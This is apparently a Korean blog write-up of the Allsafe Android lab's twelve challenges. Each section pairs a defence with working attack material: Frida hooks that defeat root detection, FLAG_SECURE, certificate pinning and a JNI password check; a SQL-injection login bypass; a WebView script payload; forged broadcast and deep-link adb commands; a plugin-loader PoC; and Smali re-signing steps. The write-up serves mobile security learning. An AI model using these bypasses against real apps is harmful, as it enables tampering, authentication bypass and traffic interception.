---
title: "Android Challenge 1~12 Write-up"
date: 2026-10-06 17:00:00 +0900
categories: ["Bug Bounty"]
tags: [allsafe, android, ctf, wargame, frida, apktool, smali, mobile-security]
---

## 1. 들어가며

[Allsafe Android](https://github.com/t0thkr1s/allsafe-android) README에 적힌 12개 문제를 순서대로 분석해보았다. Allsafe는 실제 앱에서 자주 만나는 로그 노출, 하드코딩 시크릿, exported component, WebView, SQL injection, 동적 코드 로딩, 인증서 피닝, Smali 패치와 JNI 후킹을 한 앱에 모아 둔 교육용 프로젝트다.

대상은 `master`의 `c7329155cbbd0a2079a48bbfcaa23a6666899ee9` 커밋과 v1.6 릴리스 APK다.

![Allsafe 실습 앱](/assets/img/allsafe-android/00-lab-home.png)

## 2. 실습 환경

| 항목 | 값 |
|---|---|
| Host | Windows 11 |
| Emulator | Android 15 / API 35 / Google APIs x86_64 |
| 대상 앱 | Allsafe v1.6, package `infosecadventures.allsafe` |
| 원본 APK SHA-256 | `D6792D6634A033F048F935F1269179D3C27B859C4C34B1E9E5B008A88375EFD9` |
| 동적 분석 | ADB 37.0.1, Frida 17.22.2 |
| 정적·패치 분석 | 소스 코드, Apktool 3.0.3, Android Build Tools 35.0.0 |


## 3. 결과 요약

| README # | 과제 | 확인한 결과 |
|---:|---|---|
| 1 | Insecure Logging | 입력 문자열이 `ALLSAFE` 태그 Logcat에 평문 출력 |
| 2 | Hardcoded Credentials | SOAP 계정 1쌍과 개발 URL 계정 1쌍 추출 |
| 3 | Root Detection | Frida로 `RootBeer.isRooted()`를 `false`로 변경 |
| 4 | Arbitrary Code Execution | 접두사가 일치하는 외부 APK의 `Loader.loadPlugin()` 실행 |
| 5 | Secure Flag Bypass | `Window.setFlags()` 후킹으로 `0x2000` 제거 |
| 6 | Certificate Pinning | OkHttp `check$okhttp` 후킹 지점 확인 |
| 7 | Insecure Broadcast Receiver | 외부 broadcast로 임의 URL 요청과 위조 알림 생성 |
| 8 | Deep Link Exploitation | APK 안의 정적 key로 exported Activity 통과 |
| 9 | SQL Injection | `admin' -- `로 비밀번호 조건 제거 |
| 10 | Vulnerable WebView | 사용자 HTML의 JavaScript 실행 및 파일 URL 접근 가능 |
| 11 | Smali Patching | `INACTIVE`를 `ACTIVE`로 바꿔 재빌드·서명·실행 |
| 12 | Native Library | JNI 반환값 `0`을 `1`로 바꿔 틀린 비밀번호로 통과 |

## 4. Challenge 1~12

### 4.1 Insecure Logging

`InsecureLogging.java`는 입력창의 IME 완료 이벤트에서 값을 그대로 로그에 남긴다.

```java
Log.d("ALLSAFE", "User entered secret: " + secret.getText().toString());
```

에뮬레이터에서 `MISSION56_SECRET_2026`을 입력하고 완료 키를 누른 뒤 앱 PID의 로그를 확인했다.

```bash
adb logcat -c
adb shell pidof infosecadventures.allsafe
adb logcat --pid <PID> -s ALLSAFE:D '*:S'

# D ALLSAFE : User entered secret: MISSION56_SECRET_2026
```

![Insecure Logging 입력 화면](/assets/img/allsafe-android/01-insecure-logging.png)

Android 4.1 이후 일반 앱이 다른 앱 전체 로그를 읽는 것은 제한된다. 그러나 ADB, root, 디버그 빌드, 크래시 수집기와 개발 장비에서는 여전히 회수될 수 있다. 토큰·비밀번호·개인정보를 로그에 넣지 않고 릴리스 빌드에서는 디버그 로그를 제거해야 한다.

### 4.2 Hardcoded Credentials

`HardcodedCredentials.kt`의 SOAP 요청 본문에는 `superadmin` 계정과 비밀번호가 함께 들어 있다. `strings.xml`의 개발 URL에도 `admin:password123@...` 형태의 userinfo가 존재한다.

```kotlin
<UsernameToken>superadmin</UsernameToken>
<PasswordText>supersecurepassword</PasswordText>
```

APK에 포함된 문자열은 난독화 여부와 관계없이 최종적으로 단말에서 복원되어야 한다. 따라서 공용 앱에 장기 서버 자격증명을 넣으면 안 된다. 인증 비밀은 서버에 두고 앱에는 사용자별·단기·최소 권한 토큰만 전달하는 것이 맞다. 로컬 암호 키가 필요하다면 Android Keystore와 사용자 인증 결합을 고려한다.

### 4.3 Root Detection

`RootDetection.kt`는 RootBeer 라이브러리의 단일 boolean을 보안 판단으로 신뢰한다.

```kotlin
if (RootBeer(context).isRooted) {
    // rooted
} else {
    // success
}
```

루팅 가능한 Google APIs 에뮬레이터에서 Frida 서버를 root로 실행하고 반환값을 바꿨다.

```javascript
Java.perform(function () {
  const RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
  RootBeer.isRooted.implementation = function () {
    console.log('[MISSION56] RootBeer.isRooted -> false');
    return false;
  };
});
```

콘솔에는 `[MISSION56] RootBeer.isRooted -> false`가 출력됐고 앱은 `Congrats, root is not detected!`가 표시했다.

![Frida로 RootBeer 반환값 우회](/assets/img/allsafe-android/03-root-frida-bypass.png)

### 4.4 Arbitrary Code Execution

Application 클래스의 `invokePlugins()`는 설치된 패키지 이름이 `infosecadventures.allsafe`로 시작하면 서명 확인 없이 그 패키지의 코드를 로드한다.

```kotlin
if (packageName.startsWith("infosecadventures.allsafe")) {
    val packageContext = createPackageContext(
        packageName,
        CONTEXT_INCLUDE_CODE or CONTEXT_IGNORE_SECURITY
    )
    packageContext.classLoader
        .loadClass("infosecadventures.allsafe.plugin.Loader")
        .getMethod("loadPlugin")
        .invoke(null)
}
```

`infosecadventures.allsafe.poc` 패키지에 아래 클래스를 넣은 최소 PoC APK를 빌드하고 설치했다.

```java
package infosecadventures.allsafe.plugin;

public final class Loader {
    public static void loadPlugin() {
        Log.e("ALLSAFE_POC",
            "MISSION56 external Loader.loadPlugin executed inside Allsafe process");
    }
}
```

![외부 플러그인 PoC 앱](/assets/img/allsafe-android/09-ace-plugin-poc.png)

Allsafe를 강제 종료한 뒤 다시 실행하자 다음 로그가 남았다.

```text
E ALLSAFE_POC: MISSION56 external Loader.loadPlugin executed inside Allsafe process
```

두 번째 공격면은 `/sdcard/Download/allsafe_updater.apk`가 존재하면 `DexClassLoader`로 `VersionCheck.getLatestVersion()`을 호출한다. 동적 로딩을 제거하며, 꼭 필요하다면 앱 내부 저장소, 허용된 서명 인증서와 아티팩트 해시를 실행 전에 검증해야 한다.

### 4.5 Secure Flag Bypass

`MainActivity`는 다음 코드로 일반 스크린샷과 비보안 디스플레이 출력을 막는다.

```kotlin
window.setFlags(
    WindowManager.LayoutParams.FLAG_SECURE,
    WindowManager.LayoutParams.FLAG_SECURE
)
```

Frida에서 `Window.setFlags(int, int)`를 후킹해 `0x2000` 비트를 제거했다.

```javascript
const Window = Java.use('android.view.Window');
const setFlags = Window.setFlags.overload('int', 'int');
setFlags.implementation = function (flags, mask) {
  return setFlags.call(this, flags & ~0x2000, mask & ~0x2000);
};
```

콘솔에서 `Window.setFlags FLAG_SECURE stripped`가 여러 번 출력됐고, 원래 검은색이던 캡처에 화면이 나타났다.

![FLAG_SECURE 제거 후 보이는 비밀번호 화면](/assets/img/allsafe-android/11-secure-flag-bypass.png)

`FLAG_SECURE`는 실수로 인한 캡처를 줄이는 방법이지만, 앱 프로세스를 계측하는 공격까지 막지는 못한다.

### 4.6 Certificate Pinning Bypass

앱은 먼저 고의로 잘못된 pin을 사용해 OkHttp 예외에서 현재 인증서 체인의 SHA-256 pin을 추출하고, 그 값을 다음 요청에 다시 넣는다.

```java
private static final String INVALID_HASH =
    "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

certificatePinner.add("httpbin.io", hash);
```

OkHttp 4.9.0에서는 실제 호출되는 Kotlin 내부 메서드도 확인해야 한다.

```javascript
Java.perform(function () {
  const Pinner = Java.use('okhttp3.CertificatePinner');
  Pinner['check$okhttp'].overloads.forEach(function (overload) {
    overload.implementation = function () {
      console.log('[MISSION56] bypass ' + arguments[0]);
      return;
    };
  });
});
```

![Certificate Pinning 과제 화면](/assets/img/allsafe-android/06-certificate-pinning.png)

API 35 에뮬레이터에서는 가상 NIC가 기본 route를 받지 못해 `Unable to resolve host "httpbin.io"`에서 요청이 먼저 종료됐다. 후킹 지점과 스크립트 로드를 검증했다. 별도의 정상 네트워크 단말에서는 Burp CA 신뢰 설정 후 위 스크립트로 pin 검사와 CA 검사를 분리해 확인해야 한다.

또한 실행 시 관측한 peer chain을 그대로 다음 pin으로 채택하는 설계는 정적 pinning과 다르다. 최초 연결이 공격당한 경우 공격자의 인증서를 학습할 수 있다.

### 4.7 Insecure Broadcast Receiver

Manifest의 `NoteReceiver`는 `android:exported="true"`이며 보호 permission이 없다. 수신자는 외부 Intent의 `server`, `note`, `notification_message`를 신뢰한다. 고정된 Base64 토큰까지 포함해 공격자가 지정한 host로 평문 HTTP 요청을 만든다.

```bash
adb shell am broadcast \
  -a infosecadventures.allsafe.action.PROCESS_NOTE \
  -n infosecadventures.allsafe/.challenges.NoteReceiver \
  --es server example.com \
  --es note MISSION56_FORGED_NOTE \
  --es notification_message MISSION56_BROADCAST_SUCCESS
```

```text
D ALLSAFE: http://example.com/api/v1/note/add?
  auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4%3D&note=MISSION56_FORGED_NOTE
```

API 35에서 알림을 화면으로 확인하기 위해 실습용 재패키징 APK manifest에 `POST_NOTIFICATIONS`만 추가하고 권한을 부여했다. receiver 로직은 변경하지 않았다.

![외부 broadcast로 생성한 위조 알림](/assets/img/allsafe-android/10-insecure-broadcast.png)

내부용 receiver는 `exported=false`로 두고, 외부 호출이 필요하면 signature permission과 명시적인 호출자·입력 검증을 적용해야 한다. 임의 host를 받지 말고 HTTPS allowlist를 사용해야 한다.

### 4.8 Deep Link Exploitation

Manifest는 `allsafe://infosecadventures/congrats`를 exported `DeepLinkTask`에 연결한다. Activity가 확인하는 key는 서버 값이 아니라 APK의 `strings.xml`에 있다.

```xml
<string name="key">ebfb7ff0-b2f6-41c8-bef3-4fba17be410c</string>
```

```bash
adb shell am start -W \
  -a android.intent.action.VIEW \
  -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c" \
  infosecadventures.allsafe
```

명령 결과 `DeepLinkTask`가 열리고 `Good job, you did it!`이 표시됐다.

![정적 key로 딥링크 과제 통과](/assets/img/allsafe-android/04-deep-link.png)

클라이언트에 들어 있는 정적 key는 권한 검증 수단이 될 수 없기에 서버 세션과 단발성 nonce로 상태를 검증하고, HTTPS App Link는 정확한 host/path, `autoVerify`, Digital Asset Links를 사용해야 한다.

### 4.9 SQL Injection

사용자명은 그대로, 비밀번호는 MD5로 바꾼 뒤 문자열 연결로 쿼리를 만든다.

```kotlin
db.rawQuery(
  "select * from user where username = '" + username.text +
  "' and password = '" + md5(password.text.toString()) + "'", null
)
```

username에 `admin' -- `, password에 임의 값 `x`를 입력했다. 생성된 쿼리에서 뒤쪽 비밀번호 검사가 주석 처리되고 `User: admin`과 저장된 MD5 `21232f297a57a5a743894a0e4a801fc3`을 표시했다.

![SQL 주석으로 비밀번호 검증 우회](/assets/img/allsafe-android/02-sql-injection.png)

방어법은 문자열 연결을 없애고 selection arguments를 사용하는 것이다.

```kotlin
db.rawQuery(
    "SELECT * FROM user WHERE username = ? AND password = ?",
    arrayOf(username.text.toString(), passwordHash)
)
```

MD5는 빠르고 salt가 없어 비밀번호 저장에도 부적합하다. 실제 인증은 서버에서 Argon2id, scrypt, bcrypt, PBKDF2 같은 password hashing을 사용해야 한다.

### 4.10 Vulnerable WebView

WebView는 JavaScript와 파일 접근을 켠 뒤, 사용자 문자열이 URL처럼 보이면 `loadUrl`, 그렇지 않으면 `loadData`에 그대로 전달한다.

```java
settings.setJavaScriptEnabled(true);
settings.setAllowFileAccess(true);

if (URLUtil.isValidUrl(payload)) webView.loadUrl(payload);
else webView.loadData(payload, "text/html", "UTF-8");
```

다음 payload를 입력했다.

```html
<script>alert(56)</script>
```

WebView 경고창에 `56`이 표시되어 JavaScript 실행을 확인했다.

![사용자 HTML에서 실행된 WebView JavaScript](/assets/img/allsafe-android/05-webview-xss.png)

`file:///etc/hosts` 같은 URL도 입력할 수 있는 구조다. JavaScript·파일 접근은 기본 비활성화하고, 필요한 URL은 파싱 후 scheme과 정확한 host allowlist를 검사해야 한다. 자산은 `WebViewAssetLoader` 사용을 고려한다.

### 4.11 Smali Patching

원본 Java는 지역 변수에 `Firewall.INACTIVE`를 넣고 `ACTIVE`일 때만 성공한다.

```java
Firewall firewall = Firewall.INACTIVE;
if (firewall.equals(Firewall.ACTIVE)) { /* success */ }
```

Apktool로 디코드한 Smali 한 줄을 변경했다.

```text
# before
sget-object v1, ...SmaliPatch$Firewall;->INACTIVE:...SmaliPatch$Firewall;

# after
sget-object v1, ...SmaliPatch$Firewall;->ACTIVE:...SmaliPatch$Firewall;
```

```bash
java -jar apktool_3.0.3.jar d -f allsafe.apk -o allsafe-decoded
java -jar apktool_3.0.3.jar b allsafe-decoded -o patched-unsigned.apk
zipalign -f -p 4 patched-unsigned.apk patched-aligned.apk
apksigner sign --ks mission56-debug.keystore --out allsafe-patched.apk patched-aligned.apk
apksigner verify --verbose --print-certs allsafe-patched.apk
```

서명 검증은 v1/v2/v3에서 통과했다. 패치 APK의 `[CHECK FIREWALL]`을 누르자 `Firewall is now activated, good job!`이 표시됐다.

![Smali 패치 후 성공 분기](/assets/img/allsafe-android/07-smali-patched.png)

클라이언트의 enum이나 boolean 한 개는 권한 검사가 아니기에, 결제·관리자·라이선스 같은 중요한 상태는 서버가 판단해야 한다.

### 4.12 Native Library

JNI 함수는 입력을 `K`와 XOR한 결과를 고정 문자열과 비교한다. 하지만 C++ 소스에는 평문 비밀번호 `supersecret`도 그대로 남아 있다.

```cpp
string p = "supersecret";
char k = 'K';
return hardcoreEncryption(env, pass) == "8>;.98.(9.?";
```

정답을 입력하는 대신 일부러 `definitely_wrong`을 넣고 JNI export의 반환값을 Frida로 바꿨다.

```javascript
const name = 'Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword';
const module = Process.getModuleByName('libnative_library.so');
const address = module.getExportByName(name);

Interceptor.attach(address, {
  onLeave(retval) {
    console.log('[MISSION56] original=' + retval.toInt32() + ' -> 1');
    retval.replace(1);
  }
});
```

```text
[MISSION56] native checkPassword original=0 -> 1
```

앱은 틀린 비밀번호인데도 `That's it! Excellent work!`를 표시했다.

![JNI 반환값을 바꾼 Native Library 과제](/assets/img/allsafe-android/08-native-frida-hook.png)

네이티브 라이브러리는 Java/Kotlin보다 역공학 비용이 조금 높을 뿐이고 승인과 비밀값은 서버에 두어야 한다.

## 5. 정리

12개 문제는 결국 같은 문제를 보여주고 있는것같다. 공격자는 APK, 리소스, 네이티브 라이브러리와 런타임 메모리를 모두 관찰하고 수정할 수 있다. 

1. 하드코딩된 계정·토큰·딥링크 key
2. RootBeer 결과와 `FLAG_SECURE` 같은 로컬 방어 상태
3. Smali enum, JNI boolean 같은 권한 분기
4. exported component와 WebView로 들어오는 외부 입력
5. 문자열 연결 SQL과 외부 저장소에서 가져온 실행 코드
위 다섯개 값은 클라이언트만 믿지 말자.

이번 실습에서 인상적이었던 부분은 arbitrary code execution이다. 패키지 이름 접두사가 같다는 이유로 `CONTEXT_IGNORE_SECURITY`와 외부 class loader를 사용하면 다른 앱의 코드가 Allsafe 시작 과정에 끼어든다. 반대로 `FLAG_SECURE`, root detection, native 코드처럼 보호된 것도 앱 프로세스를 계측하거나 APK를 재서명할 수 있는 환경에서는 쉽게 바뀌었다.

## 6. 참고 자료

- [Allsafe Android 공식 저장소](https://github.com/t0thkr1s/allsafe-android)
- [OWASP Mobile Application Security Testing Guide](https://mas.owasp.org/MASTG/)
- [Android Security Risks Index](https://developer.android.com/privacy-and-security/risks)
- [Android Insecure Broadcast Receiver](https://developer.android.com/privacy-and-security/risks/insecure-broadcast-receiver)
- [Android Unsafe Deep Links](https://developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks)
- [Android WebView Unsafe File Inclusion](https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

